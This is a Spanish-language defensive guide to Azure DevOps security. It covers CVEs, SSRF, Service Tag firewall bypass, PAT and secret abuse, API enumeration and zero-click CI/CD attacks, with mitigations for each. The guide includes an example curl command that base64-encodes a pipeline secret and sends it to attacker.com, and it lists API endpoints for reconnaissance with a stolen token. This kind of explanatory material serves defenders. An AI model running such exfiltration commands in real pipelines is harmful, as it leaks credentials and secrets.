Seguridad en Azure DevOps

Guía técnica de vulnerabilidades, explotación y mitigación

Este documento describe vulnerabilidades críticas que han afectado a Azure DevOps Server y Azure DevOps Services, así como malas prácticas comunes en CI/CD que pueden derivar en compromisos graves de seguridad.

Incluye:

CVEs relevantes

Vulnerabilidades de infraestructura

Abuso de credenciales y secrets

Enumeración y reconocimiento

Ataques Zero-Click en CI/CD

Recomendaciones técnicas de mitigación

📌 CVEs Específicos
🚨 CVE-2025-29813 — Privilege Escalation (CVSS 10.0)

Producto afectado: Azure DevOps Server
Impacto: Escalación de privilegios sin autenticación
Severidad: Crítica (CVSS 10.0)

🛠 ¿Cómo se explota?

Existe una vulnerabilidad que permite a un atacante remoto, sin autenticación previa, enviar una solicitud especialmente construida al servicio expuesto.

Características del ataque:

No requiere autenticación

No requiere interacción del usuario

Vector completamente remoto

Permite obtener privilegios elevados sobre la instancia

Si el servidor está expuesto a red corporativa o internet, el riesgo es máximo.

✅ ¿Cómo se mitiga?

Aplicar inmediatamente el parche oficial de Microsoft

Restringir acceso por IP (firewall o NSG)

Colocar WAF delante del servicio

Revisar logs históricos en busca de accesos anómalos

No exponer directamente Azure DevOps Server a internet

🚨 CVE-2024-20667 — Remote Code Execution mediante Queue Build

Impacto: Ejecución remota de código en agentes de pipeline

🛠 ¿Cómo se explota?

Un usuario con permisos de Queue Build puede:

Manipular entradas del proceso de build

Inyectar comandos maliciosos

Lograr ejecución arbitraria en el agente

El problema radica en cómo el sistema procesa parámetros al encolar builds.

Esto es crítico porque el permiso “Queue Build” suele considerarse de bajo riesgo.

✅ ¿Cómo se mitiga?

Aplicar parche oficial

Aplicar principio de mínimo privilegio

Revisar quién tiene permisos Queue Build

Usar agentes efímeros (self-hosted destruidos tras cada job)

Separar entornos CI (sin secretos) y CD (con secretos)

🚨 CVE-2023-36561 — Acceso indebido a Secrets en Pipelines

Impacto: Acceso a secrets de otros pipelines / Escalación interna

🛠 ¿Cómo se explota?

Un atacante con permisos en un pipeline puede:

Acceder a secrets de otros pipelines

Aprovechar validaciones incorrectas de scope

Escalar privilegios dentro del proyecto

Se explota el mal aislamiento entre pipelines.

✅ ¿Cómo se mitiga?

Aplicar parche

Separar secrets por pipeline

Usar Variable Groups con permisos explícitos

No compartir Service Connections entre proyectos

Implementar aprobación manual en recursos protegidos

🌐 Vulnerabilidades de Infraestructura
🔎 SSRF — CRLF Injection y DNS Rebinding
🛠 CRLF Injection

Permite inyectar caracteres:

\r\n

Esto puede provocar:

Manipulación de headers HTTP

Response splitting

Cache poisoning

Session hijacking

🛠 DNS Rebinding

Ataque típico:

El atacante registra un dominio controlado.

Inicialmente resuelve a IP legítima.

Tras expirar el TTL, redirige a IP interna (ej: 169.254.169.254).

El pipeline realiza requests creyendo que es externa.

Esto puede permitir acceso al metadata endpoint de Azure.

✅ Mitigación SSRF

Validar y sanitizar URLs

Bloquear IPs privadas (RFC1918) en agentes

Bloquear acceso al metadata endpoint si no es necesario

Implementar egress filtering

Resolver DNS y validar IP antes de conectar

🔥 Azure Service Tags Firewall Bypass

Servicio relacionado: Microsoft Azure

🛠 ¿Cómo se explota?

Azure permite reglas como:

Allow: AzureDevOps Service Tag

Problema:

Las Service Tags incluyen rangos compartidos

No son exclusivas de tu tenant

Un atacante con recursos en Azure puede originar tráfico desde esos rangos

Resultado: bypass del firewall.

✅ Mitigación

No confiar únicamente en Service Tags

Implementar autenticación mutua (mTLS)

Usar tokens firmados

Restringir por IP específica si es posible

Tratar Service Tags como “hint”, no como control de seguridad

🔑 Abuso de Credenciales y Secrets
🛑 Personal Access Token (PAT) Abuse
🛠 ¿Cómo se explota?

Vectores comunes:

PAT hardcodeado en repositorios

PAT filtrado en logs

PAT con scopes excesivos

PAT sin expiración corta

Un atacante con PAT puede actuar como el usuario legítimo.

✅ Mitigación

Expiración máxima de 90 días

Rotación periódica

Limitar scopes al mínimo necesario

Implementar secret scanning

Preferir Managed Identity en lugar de PAT

🧪 Pipeline Secrets Extraction

Si un atacante logra ejecutar código en pipeline:

Puede extraer secrets así:

curl https://attacker.com?data=$(echo $MY_SECRET | base64)

Los secrets:

Se enmascaran en logs

Pero siguen accesibles como variables de entorno

✅ Mitigación

No ejecutar pipelines automáticos en PRs externos

Usar Protected Resources

Requerir aprobación manual

Separar CI público de CD con secrets

Usar Azure Key Vault con Managed Identity

🔐 Service Connection Credential Theft
🛠 ¿Cómo se explota?

Las Service Connections almacenan:

Service Principals

Certificados

Tokens

Credenciales cloud

Si un pipeline tiene acceso, código malicioso puede:

Crear recursos en Azure

Exfiltrar datos

Escalar en el tenant

✅ Mitigación

Limitar permisos por pipeline

Implementar Approvals and Checks

Preferir Workload Identity Federation (OIDC)

Auditar uso regularmente

🔍 Enumeración y Reconocimiento
API Enumeration

Con un PAT robado, un atacante puede enumerar:

Proyectos

Repositorios

Pipelines

Variables

Service Connections

Usuarios

Ejemplos de endpoints:

GET https://dev.azure.com/{org}/_apis/projects
GET https://dev.azure.com/{org}/{project}/_apis/git/repositories
GET https://dev.azure.com/{org}/{project}/_apis/build/definitions
GET https://dev.azure.com/{org}/{project}/_apis/serviceendpoint/endpoints
✅ Mitigación

Proyectos privados

Limitar scopes de PAT

Conditional Access con Entra ID

Monitoreo con SIEM / Defender for DevOps

Build Variable Extraction

Variables sensibles:

System.AccessToken

Variables de entorno del agente

Rutas internas

Si System.AccessToken tiene permisos amplios, el pipeline puede llamar a la API con privilegios elevados.

✅ Mitigación

Limitar permisos del Project Build Service Account

No habilitar System.AccessToken innecesariamente

Evitar loggear variables sensibles

⚠ Zero-Click CI/CD Vulnerabilities

Las más peligrosas.

No requieren interacción humana.

🛠 Vector 1 — Pull Requests automáticos

Escenario:

Repositorio ejecuta pipeline automáticamente en PR

Un atacante crea PR desde fork

El pipeline ejecuta código del atacante

El código accede a secrets y service connections

Sin aprobación manual.

🛠 Vector 2 — Dependency Confusion

El pipeline instala dependencias:

package.json

requirements.txt

etc.

Una dependencia maliciosa puede ejecutar código arbitrario durante el build.

✅ Mitigación Zero-Click

Deshabilitar triggers automáticos en forks

Usar comment trigger (/azp run)

Separar CI público de CD privado

Implementar lockfiles

Verificación de hashes

Protected branches

Required reviewers

Approvals en environments
